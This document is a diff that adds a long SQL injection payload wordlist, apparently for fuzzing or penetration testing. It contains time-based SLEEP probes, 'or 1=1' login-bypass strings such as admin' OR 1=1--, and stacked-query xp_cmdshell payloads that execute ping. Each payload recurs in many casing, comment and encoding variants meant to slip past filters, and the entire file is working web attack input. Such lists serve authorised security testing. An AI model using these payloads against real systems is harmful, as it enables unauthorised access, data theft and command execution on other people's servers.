@@ -1,0 +1,1500 @@
+SLEEP(1) /*\u2018 or SLEEP(1) or \u2018\u201c or SLEEP(1) or \u201c*/
+sleep(1) /*\u2018 or sleep(1) or \u2018\u201c or sleep(1) or \u201c*/
+SLEEP(1) /*\u2018 OR SLEEP(1) OR \u2018\u201c OR SLEEP(1) OR \u201c*/
+SLEEP(1) /*\u2018 or SLEEP(1) or \u2018\u201c or SLEEP(1) or \u201c*/ -- 
+sleep(1) /*\u2018 or sleep(1) or \u2018\u201c or sleep(1) or \u201c*/ -- 
+SLEEP(1) /*\u2018 OR SLEEP(1) OR \u2018\u201c OR SLEEP(1) OR \u201c*/ -- 
+SLEEP(1) /*\u2018 or SLEEP(1) or \u2018\u201c or SLEEP(1) or \u201c*/ -- -
+sleep(1) /*\u2018 or sleep(1) or \u2018\u201c or sleep(1) or \u201c*/ -- -
+SLEEP(1) /*\u2018 OR SLEEP(1) OR \u2018\u201c OR SLEEP(1) OR \u201c*/ -- -
+SLEEP(1) /*\u2018 or SLEEP(1) or \u2018\u201c or SLEEP(1) or \u201c*/ --+
+sleep(1) /*\u2018 or sleep(1) or \u2018\u201c or sleep(1) or \u201c*/ --+
+SLEEP(1) /*\u2018 OR SLEEP(1) OR \u2018\u201c OR SLEEP(1) OR \u201c*/ --+
+SLEEP(1) /*\u2018 or SLEEP(1) or \u2018\u201c or SLEEP(1) or \u201c*/ #
+sleep(1) /*\u2018 or sleep(1) or \u2018\u201c or sleep(1) or \u201c*/ #
+SLEEP(1) /*\u2018 OR SLEEP(1) OR \u2018\u201c OR SLEEP(1) OR \u201c*/ #
+SLEEP(1) /*\u2018 or SLEEP(1) or \u2018\u201c or SLEEP(1) or \u201c*//*
+sleep(1) /*\u2018 or sleep(1) or \u2018\u201c or sleep(1) or \u201c*//*
+SLEEP(1) /*\u2018 OR SLEEP(1) OR \u2018\u201c OR SLEEP(1) OR \u201c*//*
+SLEEP(1) /*\u2018 or SLEEP(1) or \u2018\u201c or SLEEP(1) or \u201c*/ %23
+sleep(1) /*\u2018 or sleep(1) or \u2018\u201c or sleep(1) or \u201c*/ %23
+SLEEP(1) /*\u2018 OR SLEEP(1) OR \u2018\u201c OR SLEEP(1) OR \u201c*/ %23
+SLEEP(1) /*\u2018 or SLEEP(1) or \u2018\u201c or SLEEP(1) or \u201c*/-- 
+sleep(1) /*\u2018 or sleep(1) or \u2018\u201c or sleep(1) or \u201c*/-- 
+SLEEP(1) /*\u2018 OR SLEEP(1) OR \u2018\u201c OR SLEEP(1) OR \u201c*/-- 
+SLEEP(1)/**//*\u2018/**/or/**/SLEEP(1)/**/or/**/\u2018\u201c/**/or/**/SLEEP(1)/**/or/**/\u201c*/
+sleep(1)/**//*\u2018/**/or/**/sleep(1)/**/or/**/\u2018\u201c/**/or/**/sleep(1)/**/or/**/\u201c*/
+SLEEP(1)/**//*\u2018/**/OR/**/SLEEP(1)/**/OR/**/\u2018\u201c/**/OR/**/SLEEP(1)/**/OR/**/\u201c*/
+SLEEP(1)/**//*\u2018/**/or/**/SLEEP(1)/**/or/**/\u2018\u201c/**/or/**/SLEEP(1)/**/or/**/\u201c*/ -- 
+sleep(1)/**//*\u2018/**/or/**/sleep(1)/**/or/**/\u2018\u201c/**/or/**/sleep(1)/**/or/**/\u201c*/ -- 
+SLEEP(1)/**//*\u2018/**/OR/**/SLEEP(1)/**/OR/**/\u2018\u201c/**/OR/**/SLEEP(1)/**/OR/**/\u201c*/ -- 
+SLEEP(1)/**//*\u2018/**/or/**/SLEEP(1)/**/or/**/\u2018\u201c/**/or/**/SLEEP(1)/**/or/**/\u201c*/ -- -
+sleep(1)/**//*\u2018/**/or/**/sleep(1)/**/or/**/\u2018\u201c/**/or/**/sleep(1)/**/or/**/\u201c*/ -- -
+SLEEP(1)/**//*\u2018/**/OR/**/SLEEP(1)/**/OR/**/\u2018\u201c/**/OR/**/SLEEP(1)/**/OR/**/\u201c*/ -- -
+SLEEP(1)/**//*\u2018/**/or/**/SLEEP(1)/**/or/**/\u2018\u201c/**/or/**/SLEEP(1)/**/or/**/\u201c*/ --+
+sleep(1)/**//*\u2018/**/or/**/sleep(1)/**/or/**/\u2018\u201c/**/or/**/sleep(1)/**/or/**/\u201c*/ --+
+SLEEP(1)/**//*\u2018/**/OR/**/SLEEP(1)/**/OR/**/\u2018\u201c/**/OR/**/SLEEP(1)/**/OR/**/\u201c*/ --+
+SLEEP(1)/**//*\u2018/**/or/**/SLEEP(1)/**/or/**/\u2018\u201c/**/or/**/SLEEP(1)/**/or/**/\u201c*/ #
+sleep(1)/**//*\u2018/**/or/**/sleep(1)/**/or/**/\u2018\u201c/**/or/**/sleep(1)/**/or/**/\u201c*/ #
+SLEEP(1)/**//*\u2018/**/OR/**/SLEEP(1)/**/OR/**/\u2018\u201c/**/OR/**/SLEEP(1)/**/OR/**/\u201c*/ #
+SLEEP(1)/**//*\u2018/**/or/**/SLEEP(1)/**/or/**/\u2018\u201c/**/or/**/SLEEP(1)/**/or/**/\u201c*//*
+sleep(1)/**//*\u2018/**/or/**/sleep(1)/**/or/**/\u2018\u201c/**/or/**/sleep(1)/**/or/**/\u201c*//*
+SLEEP(1)/**//*\u2018/**/OR/**/SLEEP(1)/**/OR/**/\u2018\u201c/**/OR/**/SLEEP(1)/**/OR/**/\u201c*//*
+SLEEP(1)/**//*\u2018/**/or/**/SLEEP(1)/**/or/**/\u2018\u201c/**/or/**/SLEEP(1)/**/or/**/\u201c*/ %23
+sleep(1)/**//*\u2018/**/or/**/sleep(1)/**/or/**/\u2018\u201c/**/or/**/sleep(1)/**/or/**/\u201c*/ %23
+SLEEP(1)/**//*\u2018/**/OR/**/SLEEP(1)/**/OR/**/\u2018\u201c/**/OR/**/SLEEP(1)/**/OR/**/\u201c*/ %23
+SLEEP(1)/**//*\u2018/**/or/**/SLEEP(1)/**/or/**/\u2018\u201c/**/or/**/SLEEP(1)/**/or/**/\u201c*/-- 
+sleep(1)/**//*\u2018/**/or/**/sleep(1)/**/or/**/\u2018\u201c/**/or/**/sleep(1)/**/or/**/\u201c*/-- 
+SLEEP(1)/**//*\u2018/**/OR/**/SLEEP(1)/**/OR/**/\u2018\u201c/**/OR/**/SLEEP(1)/**/OR/**/\u201c*/-- 
+SLEEP(1)%20/*\u2018%20or%20SLEEP(1)%20or%20\u2018\u201c%20or%20SLEEP(1)%20or%20\u201c*/
+sleep(1)%20/*\u2018%20or%20sleep(1)%20or%20\u2018\u201c%20or%20sleep(1)%20or%20\u201c*/
+SLEEP(1)%20/*\u2018%20OR%20SLEEP(1)%20OR%20\u2018\u201c%20OR%20SLEEP(1)%20OR%20\u201c*/
+SLEEP(1)%20/*\u2018%20or%20SLEEP(1)%20or%20\u2018\u201c%20or%20SLEEP(1)%20or%20\u201c*/ -- 
+sleep(1)%20/*\u2018%20or%20sleep(1)%20or%20\u2018\u201c%20or%20sleep(1)%20or%20\u201c*/ -- 
+SLEEP(1)%20/*\u2018%20OR%20SLEEP(1)%20OR%20\u2018\u201c%20OR%20SLEEP(1)%20OR%20\u201c*/ -- 
+SLEEP(1)%20/*\u2018%20or%20SLEEP(1)%20or%20\u2018\u201c%20or%20SLEEP(1)%20or%20\u201c*/ -- -
+sleep(1)%20/*\u2018%20or%20sleep(1)%20or%20\u2018\u201c%20or%20sleep(1)%20or%20\u201c*/ -- -
+SLEEP(1)%20/*\u2018%20OR%20SLEEP(1)%20OR%20\u2018\u201c%20OR%20SLEEP(1)%20OR%20\u201c*/ -- -
+SLEEP(1)%20/*\u2018%20or%20SLEEP(1)%20or%20\u2018\u201c%20or%20SLEEP(1)%20or%20\u201c*/ --+
+sleep(1)%20/*\u2018%20or%20sleep(1)%20or%20\u2018\u201c%20or%20sleep(1)%20or%20\u201c*/ --+
+SLEEP(1)%20/*\u2018%20OR%20SLEEP(1)%20OR%20\u2018\u201c%20OR%20SLEEP(1)%20OR%20\u201c*/ --+
+SLEEP(1)%20/*\u2018%20or%20SLEEP(1)%20or%20\u2018\u201c%20or%20SLEEP(1)%20or%20\u201c*/ #
+sleep(1)%20/*\u2018%20or%20sleep(1)%20or%20\u2018\u201c%20or%20sleep(1)%20or%20\u201c*/ #
+SLEEP(1)%20/*\u2018%20OR%20SLEEP(1)%20OR%20\u2018\u201c%20OR%20SLEEP(1)%20OR%20\u201c*/ #
+SLEEP(1)%20/*\u2018%20or%20SLEEP(1)%20or%20\u2018\u201c%20or%20SLEEP(1)%20or%20\u201c*//*
+sleep(1)%20/*\u2018%20or%20sleep(1)%20or%20\u2018\u201c%20or%20sleep(1)%20or%20\u201c*//*
+SLEEP(1)%20/*\u2018%20OR%20SLEEP(1)%20OR%20\u2018\u201c%20OR%20SLEEP(1)%20OR%20\u201c*//*
+SLEEP(1)%20/*\u2018%20or%20SLEEP(1)%20or%20\u2018\u201c%20or%20SLEEP(1)%20or%20\u201c*/ %23
+sleep(1)%20/*\u2018%20or%20sleep(1)%20or%20\u2018\u201c%20or%20sleep(1)%20or%20\u201c*/ %23
+SLEEP(1)%20/*\u2018%20OR%20SLEEP(1)%20OR%20\u2018\u201c%20OR%20SLEEP(1)%20OR%20\u201c*/ %23
+SLEEP(1)%20/*\u2018%20or%20SLEEP(1)%20or%20\u2018\u201c%20or%20SLEEP(1)%20or%20\u201c*/-- 
+sleep(1)%20/*\u2018%20or%20sleep(1)%20or%20\u2018\u201c%20or%20sleep(1)%20or%20\u201c*/-- 
+SLEEP(1)%20/*\u2018%20OR%20SLEEP(1)%20OR%20\u2018\u201c%20OR%20SLEEP(1)%20OR%20\u201c*/-- 
+SLEEP(1)+/*\u2018+or+SLEEP(1)+or+\u2018\u201c+or+SLEEP(1)+or+\u201c*/
+sleep(1)+/*\u2018+or+sleep(1)+or+\u2018\u201c+or+sleep(1)+or+\u201c*/
+SLEEP(1)+/*\u2018+OR+SLEEP(1)+OR+\u2018\u201c+OR+SLEEP(1)+OR+\u201c*/
+SLEEP(1)+/*\u2018+or+SLEEP(1)+or+\u2018\u201c+or+SLEEP(1)+or+\u201c*/ -- 
+sleep(1)+/*\u2018+or+sleep(1)+or+\u2018\u201c+or+sleep(1)+or+\u201c*/ -- 
+SLEEP(1)+/*\u2018+OR+SLEEP(1)+OR+\u2018\u201c+OR+SLEEP(1)+OR+\u201c*/ -- 
+SLEEP(1)+/*\u2018+or+SLEEP(1)+or+\u2018\u201c+or+SLEEP(1)+or+\u201c*/ -- -
+sleep(1)+/*\u2018+or+sleep(1)+or+\u2018\u201c+or+sleep(1)+or+\u201c*/ -- -
+SLEEP(1)+/*\u2018+OR+SLEEP(1)+OR+\u2018\u201c+OR+SLEEP(1)+OR+\u201c*/ -- -
+SLEEP(1)+/*\u2018+or+SLEEP(1)+or+\u2018\u201c+or+SLEEP(1)+or+\u201c*/ --+
+sleep(1)+/*\u2018+or+sleep(1)+or+\u2018\u201c+or+sleep(1)+or+\u201c*/ --+
+SLEEP(1)+/*\u2018+OR+SLEEP(1)+OR+\u2018\u201c+OR+SLEEP(1)+OR+\u201c*/ --+
+SLEEP(1)+/*\u2018+or+SLEEP(1)+or+\u2018\u201c+or+SLEEP(1)+or+\u201c*/ #
+sleep(1)+/*\u2018+or+sleep(1)+or+\u2018\u201c+or+sleep(1)+or+\u201c*/ #
+SLEEP(1)+/*\u2018+OR+SLEEP(1)+OR+\u2018\u201c+OR+SLEEP(1)+OR+\u201c*/ #
+SLEEP(1)+/*\u2018+or+SLEEP(1)+or+\u2018\u201c+or+SLEEP(1)+or+\u201c*//*
+sleep(1)+/*\u2018+or+sleep(1)+or+\u2018\u201c+or+sleep(1)+or+\u201c*//*
+SLEEP(1)+/*\u2018+OR+SLEEP(1)+OR+\u2018\u201c+OR+SLEEP(1)+OR+\u201c*//*
+SLEEP(1)+/*\u2018+or+SLEEP(1)+or+\u2018\u201c+or+SLEEP(1)+or+\u201c*/ %23
+sleep(1)+/*\u2018+or+sleep(1)+or+\u2018\u201c+or+sleep(1)+or+\u201c*/ %23
+SLEEP(1)+/*\u2018+OR+SLEEP(1)+OR+\u2018\u201c+OR+SLEEP(1)+OR+\u201c*/ %23
+SLEEP(1)+/*\u2018+or+SLEEP(1)+or+\u2018\u201c+or+SLEEP(1)+or+\u201c*/-- 
+sleep(1)+/*\u2018+or+sleep(1)+or+\u2018\u201c+or+sleep(1)+or+\u201c*/-- 
+SLEEP(1)+/*\u2018+OR+SLEEP(1)+OR+\u2018\u201c+OR+SLEEP(1)+OR+\u201c*/-- 
+SLEEP(1)\t/*\u2018\tor\tSLEEP(1)\tor\t\u2018\u201c\tor\tSLEEP(1)\tor\t\u201c*/
+sleep(1)\t/*\u2018\tor\tsleep(1)\tor\t\u2018\u201c\tor\tsleep(1)\tor\t\u201c*/
+SLEEP(1)\t/*\u2018\tOR\tSLEEP(1)\tOR\t\u2018\u201c\tOR\tSLEEP(1)\tOR\t\u201c*/
+SLEEP(1)\t/*\u2018\tor\tSLEEP(1)\tor\t\u2018\u201c\tor\tSLEEP(1)\tor\t\u201c*/ -- 
+sleep(1)\t/*\u2018\tor\tsleep(1)\tor\t\u2018\u201c\tor\tsleep(1)\tor\t\u201c*/ -- 
+SLEEP(1)\t/*\u2018\tOR\tSLEEP(1)\tOR\t\u2018\u201c\tOR\tSLEEP(1)\tOR\t\u201c*/ -- 
+SLEEP(1)\t/*\u2018\tor\tSLEEP(1)\tor\t\u2018\u201c\tor\tSLEEP(1)\tor\t\u201c*/ -- -
+sleep(1)\t/*\u2018\tor\tsleep(1)\tor\t\u2018\u201c\tor\tsleep(1)\tor\t\u201c*/ -- -
+SLEEP(1)\t/*\u2018\tOR\tSLEEP(1)\tOR\t\u2018\u201c\tOR\tSLEEP(1)\tOR\t\u201c*/ -- -
+SLEEP(1)\t/*\u2018\tor\tSLEEP(1)\tor\t\u2018\u201c\tor\tSLEEP(1)\tor\t\u201c*/ --+
+sleep(1)\t/*\u2018\tor\tsleep(1)\tor\t\u2018\u201c\tor\tsleep(1)\tor\t\u201c*/ --+
+SLEEP(1)\t/*\u2018\tOR\tSLEEP(1)\tOR\t\u2018\u201c\tOR\tSLEEP(1)\tOR\t\u201c*/ --+
+SLEEP(1)\t/*\u2018\tor\tSLEEP(1)\tor\t\u2018\u201c\tor\tSLEEP(1)\tor\t\u201c*/ #
+sleep(1)\t/*\u2018\tor\tsleep(1)\tor\t\u2018\u201c\tor\tsleep(1)\tor\t\u201c*/ #
+SLEEP(1)\t/*\u2018\tOR\tSLEEP(1)\tOR\t\u2018\u201c\tOR\tSLEEP(1)\tOR\t\u201c*/ #
+SLEEP(1)\t/*\u2018\tor\tSLEEP(1)\tor\t\u2018\u201c\tor\tSLEEP(1)\tor\t\u201c*//*
+sleep(1)\t/*\u2018\tor\tsleep(1)\tor\t\u2018\u201c\tor\tsleep(1)\tor\t\u201c*//*
+SLEEP(1)\t/*\u2018\tOR\tSLEEP(1)\tOR\t\u2018\u201c\tOR\tSLEEP(1)\tOR\t\u201c*//*
+SLEEP(1)\t/*\u2018\tor\tSLEEP(1)\tor\t\u2018\u201c\tor\tSLEEP(1)\tor\t\u201c*/ %23
+sleep(1)\t/*\u2018\tor\tsleep(1)\tor\t\u2018\u201c\tor\tsleep(1)\tor\t\u201c*/ %23
+SLEEP(1)\t/*\u2018\tOR\tSLEEP(1)\tOR\t\u2018\u201c\tOR\tSLEEP(1)\tOR\t\u201c*/ %23
+SLEEP(1)\t/*\u2018\tor\tSLEEP(1)\tor\t\u2018\u201c\tor\tSLEEP(1)\tor\t\u201c*/-- 
+sleep(1)\t/*\u2018\tor\tsleep(1)\tor\t\u2018\u201c\tor\tsleep(1)\tor\t\u201c*/-- 
+SLEEP(1)\t/*\u2018\tOR\tSLEEP(1)\tOR\t\u2018\u201c\tOR\tSLEEP(1)\tOR\t\u201c*/-- 
+\" or 1=1
+\" OR 1=1
+\" or 1=1 -- 
+\" OR 1=1 -- 
+\" or 1=1 -- -
+\" OR 1=1 -- -
+\" or 1=1 --+
+\" OR 1=1 --+
+\" or 1=1 #
+\" OR 1=1 #
+\" or 1=1/*
+\" OR 1=1/*
+\" or 1=1 %23
+\" OR 1=1 %23
+\" or 1=1-- 
+\" OR 1=1-- 
+\"/**/or/**/1=1
+\"/**/OR/**/1=1
+\"/**/or/**/1=1 -- 
+\"/**/OR/**/1=1 -- 
+\"/**/or/**/1=1 -- -
+\"/**/OR/**/1=1 -- -
+\"/**/or/**/1=1 --+
+\"/**/OR/**/1=1 --+
+\"/**/or/**/1=1 #
+\"/**/OR/**/1=1 #
+\"/**/or/**/1=1/*
+\"/**/OR/**/1=1/*
+\"/**/or/**/1=1 %23
+\"/**/OR/**/1=1 %23
+\"/**/or/**/1=1-- 
+\"/**/OR/**/1=1-- 
+\"%20or%201=1
+\"%20OR%201=1
+\"%20or%201=1 -- 
+\"%20OR%201=1 -- 
+\"%20or%201=1 -- -
+\"%20OR%201=1 -- -
+\"%20or%201=1 --+
+\"%20OR%201=1 --+
+\"%20or%201=1 #
+\"%20OR%201=1 #
+\"%20or%201=1/*
+\"%20OR%201=1/*
+\"%20or%201=1 %23
+\"%20OR%201=1 %23
+\"%20or%201=1-- 
+\"%20OR%201=1-- 
+\"+or+1=1
+\"+OR+1=1
+\"+or+1=1 -- 
+\"+OR+1=1 -- 
+\"+or+1=1 -- -
+\"+OR+1=1 -- -
+\"+or+1=1 --+
+\"+OR+1=1 --+
+\"+or+1=1 #
+\"+OR+1=1 #
+\"+or+1=1/*
+\"+OR+1=1/*
+\"+or+1=1 %23
+\"+OR+1=1 %23
+\"+or+1=1-- 
+\"+OR+1=1-- 
+\"\tor\t1=1
+\"\tOR\t1=1
+\"\tor\t1=1 -- 
+\"\tOR\t1=1 -- 
+\"\tor\t1=1 -- -
+\"\tOR\t1=1 -- -
+\"\tor\t1=1 --+
+\"\tOR\t1=1 --+
+\"\tor\t1=1 #
+\"\tOR\t1=1 #
+\"\tor\t1=1/*
+\"\tOR\t1=1/*
+\"\tor\t1=1 %23
+\"\tOR\t1=1 %23
+\"\tor\t1=1-- 
+\"\tOR\t1=1-- 
+)%20or%20('x'='x
+)%20OR%20('X'='X
+)%20or%20('x'='x -- 
+)%20OR%20('X'='X -- 
+)%20or%20('x'='x -- -
+)%20OR%20('X'='X -- -
+)%20or%20('x'='x --+
+)%20OR%20('X'='X --+
+)%20or%20('x'='x #
+)%20OR%20('X'='X #
+)%20or%20('x'='x/*
+)%20OR%20('X'='X/*
+)%20or%20('x'='x %23
+)%20OR%20('X'='X %23
+)%20or%20('x'='x-- 
+)%20OR%20('X'='X-- 
+\u2019 or \u20181\u2019=\u20191
+\u2019 OR \u20181\u2019=\u20191
+\u2019 or \u20181\u2019=\u20191 -- 
+\u2019 OR \u20181\u2019=\u20191 -- 
+\u2019 or \u20181\u2019=\u20191 -- -
+\u2019 OR \u20181\u2019=\u20191 -- -
+\u2019 or \u20181\u2019=\u20191 --+
+\u2019 OR \u20181\u2019=\u20191 --+
+\u2019 or \u20181\u2019=\u20191 #
+\u2019 OR \u20181\u2019=\u20191 #
+\u2019 or \u20181\u2019=\u20191/*
+\u2019 OR \u20181\u2019=\u20191/*
+\u2019 or \u20181\u2019=\u20191 %23
+\u2019 OR \u20181\u2019=\u20191 %23
+\u2019 or \u20181\u2019=\u20191-- 
+\u2019 OR \u20181\u2019=\u20191-- 
+\u2019/**/or/**/\u20181\u2019=\u20191
+\u2019/**/OR/**/\u20181\u2019=\u20191
+\u2019/**/or/**/\u20181\u2019=\u20191 -- 
+\u2019/**/OR/**/\u20181\u2019=\u20191 -- 
+\u2019/**/or/**/\u20181\u2019=\u20191 -- -
+\u2019/**/OR/**/\u20181\u2019=\u20191 -- -
+\u2019/**/or/**/\u20181\u2019=\u20191 --+
+\u2019/**/OR/**/\u20181\u2019=\u20191 --+
+\u2019/**/or/**/\u20181\u2019=\u20191 #
+\u2019/**/OR/**/\u20181\u2019=\u20191 #
+\u2019/**/or/**/\u20181\u2019=\u20191/*
+\u2019/**/OR/**/\u20181\u2019=\u20191/*
+\u2019/**/or/**/\u20181\u2019=\u20191 %23
+\u2019/**/OR/**/\u20181\u2019=\u20191 %23
+\u2019/**/or/**/\u20181\u2019=\u20191-- 
+\u2019/**/OR/**/\u20181\u2019=\u20191-- 
+\u2019%20or%20\u20181\u2019=\u20191
+\u2019%20OR%20\u20181\u2019=\u20191
+\u2019%20or%20\u20181\u2019=\u20191 -- 
+\u2019%20OR%20\u20181\u2019=\u20191 -- 
+\u2019%20or%20\u20181\u2019=\u20191 -- -
+\u2019%20OR%20\u20181\u2019=\u20191 -- -
+\u2019%20or%20\u20181\u2019=\u20191 --+
+\u2019%20OR%20\u20181\u2019=\u20191 --+
+\u2019%20or%20\u20181\u2019=\u20191 #
+\u2019%20OR%20\u20181\u2019=\u20191 #
+\u2019%20or%20\u20181\u2019=\u20191/*
+\u2019%20OR%20\u20181\u2019=\u20191/*
+\u2019%20or%20\u20181\u2019=\u20191 %23
+\u2019%20OR%20\u20181\u2019=\u20191 %23
+\u2019%20or%20\u20181\u2019=\u20191-- 
+\u2019%20OR%20\u20181\u2019=\u20191-- 
+\u2019+or+\u20181\u2019=\u20191
+\u2019+OR+\u20181\u2019=\u20191
+\u2019+or+\u20181\u2019=\u20191 -- 
+\u2019+OR+\u20181\u2019=\u20191 -- 
+\u2019+or+\u20181\u2019=\u20191 -- -
+\u2019+OR+\u20181\u2019=\u20191 -- -
+\u2019+or+\u20181\u2019=\u20191 --+
+\u2019+OR+\u20181\u2019=\u20191 --+
+\u2019+or+\u20181\u2019=\u20191 #
+\u2019+OR+\u20181\u2019=\u20191 #
+\u2019+or+\u20181\u2019=\u20191/*
+\u2019+OR+\u20181\u2019=\u20191/*
+\u2019+or+\u20181\u2019=\u20191 %23
+\u2019+OR+\u20181\u2019=\u20191 %23
+\u2019+or+\u20181\u2019=\u20191-- 
+\u2019+OR+\u20181\u2019=\u20191-- 
+\u2019\tor\t\u20181\u2019=\u20191
+\u2019\tOR\t\u20181\u2019=\u20191
+\u2019\tor\t\u20181\u2019=\u20191 -- 
+\u2019\tOR\t\u20181\u2019=\u20191 -- 
+\u2019\tor\t\u20181\u2019=\u20191 -- -
+\u2019\tOR\t\u20181\u2019=\u20191 -- -
+\u2019\tor\t\u20181\u2019=\u20191 --+
+\u2019\tOR\t\u20181\u2019=\u20191 --+
+\u2019\tor\t\u20181\u2019=\u20191 #
+\u2019\tOR\t\u20181\u2019=\u20191 #
+\u2019\tor\t\u20181\u2019=\u20191/*
+\u2019\tOR\t\u20181\u2019=\u20191/*
+\u2019\tor\t\u20181\u2019=\u20191 %23
+\u2019\tOR\t\u20181\u2019=\u20191 %23
+\u2019\tor\t\u20181\u2019=\u20191-- 
+\u2019\tOR\t\u20181\u2019=\u20191-- 
+sleep(5)#
+SLEEP(5)#
+sleep(5)# -- 
+SLEEP(5)# -- 
+sleep(5)# -- -
+SLEEP(5)# -- -
+sleep(5)# --+
+SLEEP(5)# --+
+sleep(5)# #
+SLEEP(5)# #
+sleep(5)#/*
+SLEEP(5)#/*
+sleep(5)# %23
+SLEEP(5)# %23
+sleep(5)#-- 
+SLEEP(5)#-- 
+admin' OR 1=1--
+admin' or 1=1--
+ADMIN' OR 1=1--
+admin' OR 1=1-- -- 
+admin' or 1=1-- -- 
+ADMIN' OR 1=1-- -- 
+admin' OR 1=1-- -- -
+admin' or 1=1-- -- -
+ADMIN' OR 1=1-- -- -
+admin' OR 1=1-- --+
+admin' or 1=1-- --+
+ADMIN' OR 1=1-- --+
+admin' OR 1=1-- #
+admin' or 1=1-- #
+ADMIN' OR 1=1-- #
+admin' OR 1=1--/*
+admin' or 1=1--/*
+ADMIN' OR 1=1--/*
+admin' OR 1=1-- %23
+admin' or 1=1-- %23
+ADMIN' OR 1=1-- %23
+admin' OR 1=1---- 
+admin' or 1=1---- 
+ADMIN' OR 1=1---- 
+admin'/**/OR/**/1=1--
+admin'/**/or/**/1=1--
+ADMIN'/**/OR/**/1=1--
+admin'/**/OR/**/1=1-- -- 
+admin'/**/or/**/1=1-- -- 
+ADMIN'/**/OR/**/1=1-- -- 
+admin'/**/OR/**/1=1-- -- -
+admin'/**/or/**/1=1-- -- -
+ADMIN'/**/OR/**/1=1-- -- -
+admin'/**/OR/**/1=1-- --+
+admin'/**/or/**/1=1-- --+
+ADMIN'/**/OR/**/1=1-- --+
+admin'/**/OR/**/1=1-- #
+admin'/**/or/**/1=1-- #
+ADMIN'/**/OR/**/1=1-- #
+admin'/**/OR/**/1=1--/*
+admin'/**/or/**/1=1--/*
+ADMIN'/**/OR/**/1=1--/*
+admin'/**/OR/**/1=1-- %23
+admin'/**/or/**/1=1-- %23
+ADMIN'/**/OR/**/1=1-- %23
+admin'/**/OR/**/1=1---- 
+admin'/**/or/**/1=1---- 
+ADMIN'/**/OR/**/1=1---- 
+admin'%20OR%201=1--
+admin'%20or%201=1--
+ADMIN'%20OR%201=1--
+admin'%20OR%201=1-- -- 
+admin'%20or%201=1-- -- 
+ADMIN'%20OR%201=1-- -- 
+admin'%20OR%201=1-- -- -
+admin'%20or%201=1-- -- -
+ADMIN'%20OR%201=1-- -- -
+admin'%20OR%201=1-- --+
+admin'%20or%201=1-- --+
+ADMIN'%20OR%201=1-- --+
+admin'%20OR%201=1-- #
+admin'%20or%201=1-- #
+ADMIN'%20OR%201=1-- #
+admin'%20OR%201=1--/*
+admin'%20or%201=1--/*
+ADMIN'%20OR%201=1--/*
+admin'%20OR%201=1-- %23
+admin'%20or%201=1-- %23
+ADMIN'%20OR%201=1-- %23
+admin'%20OR%201=1---- 
+admin'%20or%201=1---- 
+ADMIN'%20OR%201=1---- 
+admin'+OR+1=1--
+admin'+or+1=1--
+ADMIN'+OR+1=1--
+admin'+OR+1=1-- -- 
+admin'+or+1=1-- -- 
+ADMIN'+OR+1=1-- -- 
+admin'+OR+1=1-- -- -
+admin'+or+1=1-- -- -
+ADMIN'+OR+1=1-- -- -
+admin'+OR+1=1-- --+
+admin'+or+1=1-- --+
+ADMIN'+OR+1=1-- --+
+admin'+OR+1=1-- #
+admin'+or+1=1-- #
+ADMIN'+OR+1=1-- #
+admin'+OR+1=1--/*
+admin'+or+1=1--/*
+ADMIN'+OR+1=1--/*
+admin'+OR+1=1-- %23
+admin'+or+1=1-- %23
+ADMIN'+OR+1=1-- %23
+admin'+OR+1=1---- 
+admin'+or+1=1---- 
+ADMIN'+OR+1=1---- 
+admin'\tOR\t1=1--
+admin'\tor\t1=1--
+ADMIN'\tOR\t1=1--
+admin'\tOR\t1=1-- -- 
+admin'\tor\t1=1-- -- 
+ADMIN'\tOR\t1=1-- -- 
+admin'\tOR\t1=1-- -- -
+admin'\tor\t1=1-- -- -
+ADMIN'\tOR\t1=1-- -- -
+admin'\tOR\t1=1-- --+
+admin'\tor\t1=1-- --+
+ADMIN'\tOR\t1=1-- --+
+admin'\tOR\t1=1-- #
+admin'\tor\t1=1-- #
+ADMIN'\tOR\t1=1-- #
+admin'\tOR\t1=1--/*
+admin'\tor\t1=1--/*
+ADMIN'\tOR\t1=1--/*
+admin'\tOR\t1=1-- %23
+admin'\tor\t1=1-- %23
+ADMIN'\tOR\t1=1-- %23
+admin'\tOR\t1=1---- 
+admin'\tor\t1=1---- 
+ADMIN'\tOR\t1=1---- 
+'; exec master..xp_cmdshell 'ping 10.10.1.2'--
+'; EXEC MASTER..XP_CMDSHELL 'PING 10.10.1.2'--
+'; exec master..xp_cmdshell 'ping 10.10.1.2'-- -- 
+'; EXEC MASTER..XP_CMDSHELL 'PING 10.10.1.2'-- -- 
+'; exec master..xp_cmdshell 'ping 10.10.1.2'-- -- -
+'; EXEC MASTER..XP_CMDSHELL 'PING 10.10.1.2'-- -- -
+'; exec master..xp_cmdshell 'ping 10.10.1.2'-- --+
+'; EXEC MASTER..XP_CMDSHELL 'PING 10.10.1.2'-- --+
+'; exec master..xp_cmdshell 'ping 10.10.1.2'-- #
+'; EXEC MASTER..XP_CMDSHELL 'PING 10.10.1.2'-- #
+'; exec master..xp_cmdshell 'ping 10.10.1.2'--/*
+'; EXEC MASTER..XP_CMDSHELL 'PING 10.10.1.2'--/*
+'; exec master..xp_cmdshell 'ping 10.10.1.2'-- %23
+'; EXEC MASTER..XP_CMDSHELL 'PING 10.10.1.2'-- %23
+'; exec master..xp_cmdshell 'ping 10.10.1.2'---- 
+'; EXEC MASTER..XP_CMDSHELL 'PING 10.10.1.2'---- 
+';/**/exec/**/master..xp_cmdshell/**/'ping/**/10.10.1.2'--
+';/**/EXEC/**/MASTER..XP_CMDSHELL/**/'PING/**/10.10.1.2'--
+';/**/exec/**/master..xp_cmdshell/**/'ping/**/10.10.1.2'-- -- 
+';/**/EXEC/**/MASTER..XP_CMDSHELL/**/'PING/**/10.10.1.2'-- -- 
+';/**/exec/**/master..xp_cmdshell/**/'ping/**/10.10.1.2'-- -- -
+';/**/EXEC/**/MASTER..XP_CMDSHELL/**/'PING/**/10.10.1.2'-- -- -
+';/**/exec/**/master..xp_cmdshell/**/'ping/**/10.10.1.2'-- --+
+';/**/EXEC/**/MASTER..XP_CMDSHELL/**/'PING/**/10.10.1.2'-- --+
+';/**/exec/**/master..xp_cmdshell/**/'ping/**/10.10.1.2'-- #
+';/**/EXEC/**/MASTER..XP_CMDSHELL/**/'PING/**/10.10.1.2'-- #
+';/**/exec/**/master..xp_cmdshell/**/'ping/**/10.10.1.2'--/*
+';/**/EXEC/**/MASTER..XP_CMDSHELL/**/'PING/**/10.10.1.2'--/*
+';/**/exec/**/master..xp_cmdshell/**/'ping/**/10.10.1.2'-- %23
+';/**/EXEC/**/MASTER..XP_CMDSHELL/**/'PING/**/10.10.1.2'-- %23
